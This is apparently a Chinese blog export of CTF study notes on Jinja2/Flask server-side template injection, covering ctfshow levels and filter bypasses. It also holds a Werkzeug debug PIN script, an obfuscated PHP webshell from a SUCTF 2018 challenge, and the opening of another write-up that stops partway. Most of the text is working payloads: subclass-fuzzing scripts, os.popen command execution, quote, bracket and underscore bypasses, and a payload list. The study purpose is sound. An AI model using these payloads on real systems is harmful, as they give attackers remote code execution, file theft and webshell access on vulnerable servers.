s_\n返回所有仍处于活动状态的引用的列表，列表按定义顺序排列（用于找子类）\n\n\n_globals_\n获取函数所属空间下可使用的模块、方法及变量（用于访问全局变量）\n\n\n_import_\n用于导入模块，经常用于导入os模块\n\n\n_builtins_\n返回Python中的内置函数，如eval\n\n\n获取对象所属的类\n&#x27;&#x27;.__class__&lt;class &#x27;str&#x27;&gt;().__class__&lt;class &#x27;tuple&#x27;&gt;[].__class__&lt;class &#x27;list&#x27;&gt; &quot;&quot;.__class__&lt;class &#x27;str&#x27;&gt;\n\n\n\n获取父类\n&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__(&lt;class &#x27;object&#x27;&gt;,)&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)\n\n\n\n获取子类\n&#x27;&#x27;.__class__.__base__.__subclasses__()&#x27;&#x27;.__class__.__bases__[0].__subclasses__()&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()\n\n3.常用注入模块每次获取到的各种类实在太多了，根本不知道用哪些\n\n\n1.文件读取我们进行文件读取需要使用到子类:\n&lt;class&#x27;_frozen_importlib_external.FileLoader&#x27;&gt;\n\n这个函数可以进行服务器的文件读取，但是在这之前我们需要判断是否存在这个子类，我们通过一个简单的脚本去拿到子类然后找出来\nimport requestsurl=&#x27;&#x27;for i in range(500):    data=&#123;        &#x27;name&#x27;:&#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&#x27;    &#125;    try:        response = requests.post(url,data=data)        if response.status_code==200:            if &#x27;_frozen_importlib_external.FileLoader&#x27; in response.text:                print(i)    except:        pass\n\n这个就是进行了一个简单的查询，把查询到序号输出\n我们找到模块之后就需要调用这个模块上面的内置函数，我们读取文件使用的是get_data()这个模块中的内置方法\n回来了，我果然还是脚本水平不行，这个脚本没错。只不过我之前用的都是POST请求，GET请求的时候需要把请求那里的data改为params\nget_data 的作用\nget_data 方法的主要功能是从文件系统中读取指定路径的文件内容，并将其作为字节数据返回。可以读取任意文件\n语法\ndef get_data(self, path: str) -&gt; bytes:\n\n我们可以通过这个构造payload：\n&#123;&#123;().__class__.__base__.__subclasses__()[79][&#x27;get_data&#x27;](0,&#x27;/flag&#x27;)&#125;&#125;\n\n\n\n2.内建函数eval命令执行php里面有eval进行任意代码执行，python里面也有，但是这次eval属于一个函数，我们首先需要找到带有eval()函数的模块，和之前查找模块的脚本差不多\nimport requestsurl=&#x27;&#x27;for i in range(500):    data=&#123;        &#x27;name&#x27;:&#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&quot;__builtins__&quot;]&#125;&#125;&#x27;#__init__对这个子类进行实体化，__globals__获取所有的可使用的模块、方法及变量    &#125;    try:        response = requests.post(url,data=data)        if response.status_code==200:            if &#x27;eval&#x27; in response.text:                print(i)    except:        pass\n\n在 Python 中，__builtins__ 是一个内置模块，包含了 Python 的所有内置函数、异常和常量。它是 Python 解释器在启动时自动加载的，提供了语言的核心功能。\n所以我们可以通过访问__builtins__去获取这个模块所有的内置函数，我们去这里面找到这个模块去使用eval()函数\nos 模块是 Python 标准库中的一个核心模块，提供了与操作系统交互的功能。通过 os 模块，你可以执行以下操作：\n\n管理文件和目录。\n执行系统命令。\n获取系统信息。\n管理环境变量。\n\n我们可以通过使用os模块下的popen方法，去进行命令执行\nos.popen() 是 os 模块中的一个方法，用于执行系统命令并获取其输出。它允许你通过 Python 脚本与操作系统的 shell 进行交互，并捕获命令的输出或向其输入数据。\n语法\nos.popen(command, mode=&#x27;r&#x27;, buffering=-1)\n\n\n**command**：要执行的系统命令（字符串）。\n**mode**：模式，默认为 &#39;r&#39;（读取命令的输出）。也可以是 &#39;w&#39;（向命令输入数据）。\n**buffering**：缓冲策略，默认为 -1（使用系统默认缓冲）。\n\n在执行完命令以后，我们需要加一个read()函数让命令执行结果去回显到页面\n我们构造一个payload:\n&#123;&#123;().__class__.base.__.__subclass__.()[37].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;)&#125;&#125;\n\n通过import方法引入‘os’模块，使用popen执行shell命令，使用read函数回显\n我们还有其他方法去引入os模块\n\n\n\n\n3.os模块执行命令我们之前使用eval命令执行的条件是通过eval执行引入’os’模块的方法，我们也可以不使用eval函数\n我们可以像之前一样，直接在所有子类中找到含有os模块的子类然后进行调用os模块即可\n\n\n这是一些加载os模块的一些方法\nos._wrap_close\n4.importlib类执行命令\n\n我么也可以通过找到importlib这个子类去加载os模块\n但是这个查找和文件读取的查找差不多，大概就是系统固定这个子类肯定包含这个函数\n这个类长得和import很像不是没有原因的，和import加载各种库一样，这个也可以去加载其他库，我们使用load_module这个函数加载库\npayload\n&#123;&#123;[].__class__.__base__.__subclasses__()[37][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&#x27;cat flag.php&#x27;).read()&#125;&#125;\n\n\n\n5.linecache函数执行命令\n\n这又和我们之前的东西不一样了，之前我一直以为是类-&gt;模块-&gt;函数这个模式去调用的\n模块要么从类中直接加载，要么通过函数加载。但是这个方法的出现打破了我之前的大部分理解，函数中引入了模块，而且加载模块不是执行什么代码，而是直接从函数中加载模块和类一样，只能说明这三者的关系应该是相互包含\n6.subprocess.Popen类执行命令\n\n\n\n\n\n\n\n4.ctfshow学完了一些注入模块，后面又到了经典的ctfshow环节，绕过方法等写完题目后自然就会了\n361关这是第一个题目，刚开始是做的时候还不是很熟悉，出了很多问题，但现在都解决了，由于是第一个题目，我会用文件读取和命令执行两种方法去拿到flag\n文件读取\n这个题目是通过GET请求参数name实现SSTI注入的，没有任何过滤，我们先通过脚本找到文件读取需要的子类的位置\nimport requestsurl=&#x27;http://976724af-5bca-49c2-9f9e-b209c0856d21.challenge.ctf.show/&#x27;for i in range(500):    params=&#123;        &#x27;name&#x27;:&#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&#x27; +str(i)+ &#x27;]&#125;&#125;&#x27;    &#125;    try:        response = requests.get(url,params=params)        if response.status_code==200:            #print(response.text)            if &#x27;_frozen_importlib_external.FileLoader&#x27; in response.text:                print(i)    except:        pass\n\n这个子类中固定有get_data()函数，我们使用其读取指定路径下的文件，但我感觉这个有点鸡肋，我们该怎么知道flag的路径\npayload:\nname=&#123;&#123;().__class__.__base__.__subclasses__()[94][&#x27;get_data&#x27;](0,&#x27;/flag&#x27;)&#125;&#125;\n\n\n\n命令执行\n我感觉这个方法才是以后的主流解题方法，毕竟命令执行随便就能拿到flag。\n我们还是先用脚本试下有没有命令执行函数\nimport requestsurl=&#x27;http://976724af-5bca-49c2-9f9e-b209c0856d21.challenge.ctf.show/&#x27;for i in range(500):    params=&#123;        &#x27;name&#x27;:&#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;].__init__.__globals__&#125;&#125;&#x27;    &#125;    try:        response = requests.get(url,params=params)        if response.status_code==200:            if &#x27;popen&#x27; in response.text:                print(i)    except:        pass\n\n也是成功跑出来了，直接调用popen命令执行\n&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&quot;cat /flag&quot;).read()&#125;&#125;\n\n\n\n362关这个题目和之前差不多，但是我们在执行\nname=&#123;&#123;().__class__.__mro__[1].__subclasses__()[2]&#125;&#125;\n\n的时候没回显，3的时候也是，也就是过滤掉了2和3，\n但是我们使用文件读取脚本还是查到了模块我们可以直接文件读取\nname=&#123;&#123;().__class__.__mro__[1].__subclasses__()[94][&#x27;get_data&#x27;](0,&#x27;/flag&#x27;)&#125;&#125;\n\n\n\n但是重点还是在命令执行 ，我们想通过os模块进行命令执行，我们先尝试查找，发现正常脚本查找没找到，应该是过滤数字把os模块过滤掉了\n我们只能使用固定路径去访问\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;).read()&#125;&#125;#我们也可以使用config&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;).read()&#125;&#125;#还有url_for&#123;&#123;url_for.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;).read()&#125;&#125;\n\n这些都可以固定访问到os模块\n363关这个题目可以通过固定查找拿到os模块，但是好像过滤掉了’os’关键字，试了一下，实际上过滤掉了引号，那我们直接绕过即可\nname=&#123;&#123;lipsum.__globals__[request.args.os][request.args.popen](request.args.flag).read()&#125;&#125;&amp;os=os&amp;popen=popen&amp;flag=cat /flag\n\n通过request.args.os等去将参数值转化为字符串\n364关在363关的基础上多过滤了arg，我们有很多方法，把arg换成value(获取全部参数)就行了\nname=&#123;&#123;lipsum.__globals__[request.values.os][request.values.popen](request.values.flag).read()&#125;&#125;&amp;os=os&amp;popen=popen&amp;flag=cat /flag\n\n\n\n365关这一关在过滤掉了中括号的同时也过滤掉了引号，但是把values放出来了，我们还是可以绕过。中括号就用__getitem__绕过就行了\n但是需要注意的是__getitem__是从字典中加载，我们之前是从模板中去用popen函数，模板不是字典所以没法用__getitem__加载。我们得从子类中去用popen函数\npayload:\n?name=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag\n\n先找到os._wrap_close这个子类然后使用popen函数\n366关这一关过滤了下划线，我们直接使用attr()过滤器即可，但是我看见了大佬payload独特的写法\n&#123;&#123;(lipsum|attr(request.values.globals)).os.popen(request.values.flag).read()&#125;&#125;&amp;globals=__globals__&amp;flag=cat /flag\n\n直接在查找出来的字典中.os就可以用os模块了，还能这样写\n5.绕过方法果然还是离不开过滤绕过\n1.大括号过滤我们之前的payload都是基于&#123;&#123;&#125;&#125;进行注入的，但是这个被过滤了，我们只能选择&#123;% %&#125;\n&#123;% %&#125;是属于flask的控制语句，且以&#123;% end...%&#125;结尾，可以通过在控制语句定义变量或者写循环\n\n我们无法像&#123;&#123;&#125;&#125;那样直接回显，但是我们可以利用函数print()去把执行结果打印出来，\n&#123;% if 2&gt;1 %&#125; 37 &#123;% endif%&#125;\n\n这样就会成功回显数字37，因此我们可以利用if语句去执行我们的SSTI注入\n&#123;%if&#x27;&#x27;.__class__.__base__.__subclasses__()[].__init__.__globals__[&#x27;popen&#x27;] %&#125;37 &#123;% endif%&#125;\n\n我们可以通过这个方式找到popen函数\n我们也可以直接调用os模块\n&#123;%print(lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;).read())%&#125;\n\n\n\n\n\n2.[]过滤当我们的[]被过滤掉的时候，我们就无法直接调用命令执行的函数[‘popen’]等一系列函数\n这时候我们就需要用到__getitem__魔术方法\n__getitem__ 是 Python 中的一个重要魔术方法，用于实现对象的索引访问功能。它允许你的自定义类实例像序列或映射一样使用 [] 运算符进行访问。\n\n\ndef __getitem__(self, key):    # 实现索引访问逻辑    return value\n\n当我们查询结果出来以后会发现其实每个模块和函数之间都是用的逗号隔开名字和函数内容之间使用:隔开，所以返回的就是python里面的字典，我们利用__gettitem__去打开函数，总之用到[]的地方用就行了\n我们构造一个payload\n&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(37).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /app/falg&#x27;).read()&#125;&#125;\n\n\n\n3.引号过滤引号使用来包裹函数和模块名字和代码的，引号被过滤了也就意味着没办法直接引用函数的名字和代码了\n我们当然还是有办法的，就是使用request获取我们的请求内容来实现函数名和代码的注入\nFlask 的 request 对象是处理客户端 HTTP 请求的核心工具，它封装了所有客户端发送的请求数据。\n\n\n\n\n我们需要的就是在用到需要引号的地方把函数名和代码用request的其他方法去传入然后再用request函数引用\n4.过滤器绕过下划线过滤SSTI学到现在，最烦的就是有好多下划线，关键是使用魔术方法必须用4个下划线，现在好了，过滤掉了，大家都别用了\n我们需要用到的就是过滤器，先看下常用的过滤器\n\n\n我们主要使用的是 attr()去获取属性比如attr(__class__) 然后去使用管道符去将对象属性去传入下一个atter()\n我们还是直接构造payload:\n&#123;&#123;()|atter(__class__)|atter(__base__)|atter(__subclasses__)()|atter(__getitem__)(117)|atter(__init__)|atter(__globals__)|atter(__getitem__)(&#x27;popen&#x27;)(&#x27;cat /app/flag&#x27;)|atter(&#x27;read&#x27;)()&#125;&#125;#由于过滤掉了下滑线，我们得用requers.args. 用GET请求去传参\n\n\n\n不知道为什么不能直接加[117]，得用__getitem__\n我们发现了，这个payload也可以去绕过点号的过滤\n5.中括号绕过点号的过滤说真的，之前其实不知道payload里面的点号是干什么用的，\n点号是用来访问外来属性的，难怪每个魔术方法之间都需要用点号隔开\n当点号被过滤掉的时候，我们也可以使用中括号[]去访问对象属性\n&#123;&#123;()[&#x27;__class__&#x27;][&#x27;__base__&#x27;]&#125;&#125;\n\n6.关键字过滤\n\n\n\n+拼接\n我们需要的就是把一个引号变为两个引号，把关键词拆开即可\n&#123;&#123;()[&#x27;__class__&#x27;]&#125;&#125;-&gt;&#123;&#123;()[&#x27;__cl&#x27;+&#x27;ass__&#x27;]&#125;&#125;\n\n~拼接\n和+不同的是+是字符串拼接符，而~是变量拼接符，我们把关键字拆成两个变量然后通过~进行拼接即可\n&#123;%set a=&#x27;__cla&#x27;%&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;()[a~b]&#125;&#125;\n\nreverse过滤器\n这个过滤器的作用就是把管道符前面字符串翻转过来\n&#123;%set a=&#x27;__ssalc__&#x27;|reverse%&#125;#然后用变量注入就行了\n\n还有其他过滤器，但是我感觉都挺麻烦的\n\n\n7.数字过滤我们通过拼接符可以绕过关键词过滤，但当过滤掉数字的时候，我们则需要使用另外一个过滤器length\n我们通过length计算出字符串的长度，将返回的数字赋值给变量，当需要使用数字的时候用变量即可\n&#123;% set a=&#x27;aaaa&#x27;|length %&#125;&#123;&#123;a&#125;&#125;#返回4#当我们需要很大的数字的时候由于不是字符串，无法进行拼接，我们可以通过四则运算计算出需要的数字&#123;% set a=&#x27;aaaaaaaaaa&#x27;|length*&#x27;aaa&#x27;|length%&#125;&#123;&#123;a&#125;&#125;#返回30   其他运算符也可以用 \n\n\n\n8.config文件读取有时候有一些有用的信息会储存在config中，我们之前调用config时直接使用的是&#123;&#123;config&#125;&#125;相当于调用config这个全局对象\n在 Flask 中，&#123;&#123; config &#125;&#125; 会返回 应用的配置对象，包含：\n\n数据库连接信息（SQLALCHEMY_DATABASE_URI）\n密钥（SECRET_KEY）\n调试模式（DEBUG = True/False）\n其他自定义配置\n\n但是，出现某些过滤的时候我们无法直接调用，这个时候就需要进行一个绕过。\nimport flaskimport osapp = flask.Flask(__name__)app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)#注册了一个名为FLAG的config@app.route(&#x27;/&#x27;)def index():    return open(__file__).read()@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]        return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) #这里把config,self做了黑名单过滤，替换为空        + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)#&#123;&#123;config&#125;&#125;\n\n这个代码执行完了之后，会把下面进行模板注入，导致我们的config和self对象被赋值为None\n[&#x27;&#123;% set config=None%&#125;&#x27;, &#x27;&#123;% set self=None%&#125;&#x27;]\n\n于是我们就需要采用间接读取的方式去读取config，而不是直接使用config这个全局变量\npayload:\n&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;&#123;&#123;get_flashed_message.__globals__[&#x27;current_app&#x27;].config&#125;&#125;\n\n这样就行了，原理我不是特别清楚\n9.编码绕过我没想到我看网课竟然没注意到这么重要的东西，有了这个之后关键字过滤和下划线过滤全部都是小卡拉米了\n我们可以使用八&#x2F;十六进制和Unicode编码表示注入语句，前提是要被引号包裹\n&#123;&#123;&#x27;\\x66\\x6c\\x61\\x67&#x27;&#125;&#125;  # 十六进制表示&quot;flag&quot;&#123;&#123;&#x27;\\146\\154\\141\\147&#x27;&#125;&#125;  # 八进制表示&quot;flag&quot;&#123;&#123;&#x27;\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074&#x27;&#125;&#125;  # &quot;request&quot; Unicode编码&#123;&#123;request|attr(&#x27;%61%70%70%6c%69%63%61%74%69%6f%6e&#x27;)&#125;&#125;  # &quot;application&quot; url编码\n\n但是我们需要注意的是\n在大多数模板引擎（如 Jinja2）中，属性访问操作符（.）后必须直接跟标识符（变量名），而不能是字符串或 Unicode 转义序列。\n所以我们不能这么写\n&#123;&#123;&#x27;&#x27;.&#x27;\\u005f\\u005fclass\\u005f\\u005f&#x27;&#125;&#125; #错误&#123;&#123;&#x27;&#x27;[&#x27;\\u005f\\u005fclass\\u005f\\u005f&#x27;]&#125;&#125; #正确 这样我们就不需要用到点号了\n\n下面来个Uncode编码实例\n&#123;&#123;&#x27;&#x27;[&#x27;\\u005f\\u005fclass\\u005f\\u005f&#x27;][&#x27;\\u005f\\u005f\\u0062\\u0061\\u0073\\u0065\\u005f\\u005f&#x27;][&#x27;\\u005f\\u005f\\u0073\\u0075\\u0062\\u0063\\u006c\\u0061\\u0073\\u0073\\u0065\\u0073\\u005f\\u005f&#x27;]()[132][&#x27;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&#x27;][&#x27;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&#x27;]&#125;&#125;\n\n\n\n\n\n6.无回显SSTI1.反弹shell我们之前在命令执行里面学过反弹shell，就是通过把目标服务器的输入和输出重定向到我们的云服务器，然后进行攻击\n但大多数情况下，反弹shell都不可行，毕竟这个成了甚至可以黑掉一个服务器\nSSTI反弹shell和php差不多，都是先对端口进行监听，然后让目标服务器去访问云服务器下的那个监听端口\n\n\n\n\n2.dnslog外带就是和命令执行dnslog外带一样，在查询结果后面加上dns域名，就可以实现dnslog外带\n但还是不知道为什么，还是和反弹shell一样很难成功\n3.布尔盲注这个和sql注入时的布尔盲注一样，通过ascii()和二分法将查询结果一个字符一个字符的推断出来\n\n\n\n\n7.pin码计算这虽然好像不是SSTI漏洞里面的，但是题目要考啊，还有怎么看都看不懂妈的，怎么憋了个最难的在后面\n这个就是个跑脚本的题目，我们需要获得各种信息去用脚本把pin码拿到\nfrom itertools import chainimport hashlibprobably_public_bits = [    &#x27;root&#x27;,# username    &#x27;flask.app&#x27;,# modname    &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),]private_bits = [    &#x27;2485377607013&#x27;# str(uuid.getnode()),  /sys/class/net/eth0/address    &#x27;225374fa-04bc-4346-9f39-48fa82829ca98ae216c33a023e99b3aa1b822876f337c4b661e6896495a51de52122e8bd019b&#x27;, # get_machine_id(),/etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode(&#x27;utf-8&#x27;)    h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None:    h.update(b&#x27;pinsalt&#x27;)    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)                          for x in range(0, len(num), group_size))            break    else:        rv = numprint(rv)\n\n我们需要获得的信息有\npin码有六个要素：\nusername 在可以任意文件读的条件下读 &#x2F;etc&#x2F;passwd进行猜测\nmodname 一般是flask.app\ngetattr(app, “name“, app.class.name)  一般是Flask\nmoddir flask库下app.py的绝对路径    可以通过报错获取\nint(uuid,16)    即 当前网络的mac地址的十进制数\n通过uuid.getnode()读取，通过文件/sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算get_machine_id()     \n机器的id每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id，docker靶机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，在非docker环境下读取后两个，非docker环境三个都需要读取\n/etc/machine-id/proc/sys/kernel/random/boot_id/proc/self/cgroup\n\n\n\n\n\n这些路径都是固定的，我们要做的就是通过各种方式访问到这些文件当中\n8.一些常见的payload有时候参数的传递方式不是直接通过post传递，或者对数据进行了替换等特殊处理，导致焚靖不能直接梭哈，收集一些payload去梭哈\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;&#123;&#123;url_for.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;).read()&#125; &#123;%print lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()%&#125;#这些一般是通过全局变量访问模块进行命令执行 &#123;&#123;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#125;&#125;#这个payload大概率被禁了，虽然感觉很有dao&#123;%print ((cycler.next.__globals__.__builtins__.__import__(&quot;os&quot;))[&quot;p&quot;&quot;open&quot;](&quot;cat /flag&quot;)).read()%&#125;# cycler.next的确是很少被禁用的\n\n\n\n\n\n想了一下，刚才做题才发现，即使是固定的payload也是会变的，有时候找不到os这个或者其他模块，这样看来，提前准备好编码payload便没多少意义了。还不如自己现场编码\n"},{"title":"SSTI进阶","url":"/2025/06/10/SSTI%E8%BF%9B%E9%98%B6/","content":"SSTI注入进阶版前言我以为SSTI到此为止了，直到我被新生赛的题目打爆后，直接冷静好多了。之前我以为只要掌握常规的绕过方法比如编码绕过这种可以无视关键词的过滤方法就差不了，但是直到题目把引号和中括号都过率了，我就知道要无了。\n这里主要收集在题目中遇到的各种绕过姿势作为payload\n"},{"title":"[SUCTF_2018]GetShell","url":"/2025/04/23/SUCTF-2018-GetShell/","content":"[SUCTF_2018]GetShell这个比赛的题目都好难，我们根据名字推测是文件上传，尝试访问upload.php\nif($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123;    $data=substr($contents,5);    foreach ($black_char as $b) &#123;        if (stripos($data, $b) !== false)&#123;            die(&quot;illegal char&quot;);        &#125;    &#125;     &#125; \n\n观察代码发现这是一个对文件内容的过滤拿到除前面六个字符后面的内容(目前还不知道怎么通过6个字符写一句话木马)，然后进行黑名单过滤\n于是我们只能绕过未知的黑名单写马了\n尝试之后发现数字和字母都被过滤掉了，这就又到了我们的无数字字母写马的时候了，我们之前用的是异或拼接和取反\n1.异或拼接就是利用两个不可见字符进行异或运算得到我们想要的字符，我们再将得到的字符拼接起来构成一句话木马即可\n我们首先抄大佬的异或拼接马\n&lt;?=$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);\n\n但是不知道为什么也被过滤掉了，看来这题题解只用取反绕过是有原因的\n2.取反拼接和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。\n方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如&#39;和&#39;&#123;2&#125;的结果是&quot;\\x8c&quot;，其取反即为字母s：\n\n\n我们利用一些奇怪的字符进行取反拿到我们需要的字母\n大佬的payload\n&lt;?php$__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);$_=$__/$__;$____=&#x27;&#x27;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#x27;_&#x27;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);\n\n我们这题没有过滤的字符有$ ( ) [ ] _ ~ ;\n异或符被过滤掉了，难怪第一种不行\n由于多过滤的一些字符，我们还是不能直接用上面的payload，我们用wp的\n&lt;?php$_=[]; //$__=$_.$_; //arrayarray$_=($_==$__);//$_=(array==arrayarray)明显不相同 false 0$__=($_==$_);//$__=(array==array) 相同返回1$___ = ~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];//system$____ = ~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];//_POST$____($$__[_]);//也就是system($_POST[_])\n\n&lt;?=$_=[];$__=$_.$_;$_=($_==$__);$__=($_==$_);$___=~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];$____=~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];$___($$____[_]);\n\n有可能是把回车给过滤掉了，我们只能上传第二个没有回车的取反马\n我们利用_进行命令执行即可\n\n"},{"title":"[SUCTF_2018]annonymous","url":"/2025/05/02/SUCTF-2018-annonymous/","content":"[SUCTF_2018]annonymous &lt;?php$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function SUCTF_$hash()&#123;&quot;    .&quot;global \\$MY;&quot;    .&quot;\\$MY();&quot;    .&quot;&#125;&quot;);if(isset($_GET[&#x27;func_name&#x27;]))&#123;    $_GET[&quot;func_name&quot;]();    die();&#125;show_source(__FILE__); \n\n这题看下来感觉和之前那个mt_rand()伪随机数有点像，我们先挨个看\ncreat_function()\ncreate_function() 是 PHP 中一个用于动态创建匿名函数的函数，但在 PHP 7.2.0 中已被弃用，在 PHP 8.0.0 中完全移除。现在应该使用更现代、更安全的匿名函数语法（闭包）。\ncreate_function(string $args, string $code): string\n\n\n$args：函数参数，以字符串形式表示（如 &#39;$a, $b&#39;）\n$code：函数体代码，以字符串形式表示\n\n返回值则是变量就相当于函数名，和函数一样调用\n我们看代码中直接通过eval创建的函数调用了我们creat_function创建出来的函数，但是对于函数名那里进行了随机字符串加密，我们需要推出随机字符串，然后在下面的GET请求中调用这个函数\nopenssl_random_pseudo_bytes()\nopenssl_random_pseudo_bytes() 是 PHP 中用于生成伪随机字节串的函数，它使用 OpenSSL 库的加密强伪随机数生成器(CSPRNG)。\nopenssl_random_pseudo_bytes(int $length, bool &amp;$strong_result = null): string|false\n\n\n$length：要生成的字节长度，必须为正整数\n$strong_result（可选）：引用传递的布尔值，用于指示生成的随机数是否被认为是”强”的加密安全\n\n直接返回生成的随机字符串\n看了题解后我发现我错了，他们都是利用了creatS_function()创建的不是完全的匿名函数，我们尝试去输出试一下\n&lt;?php$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);echo 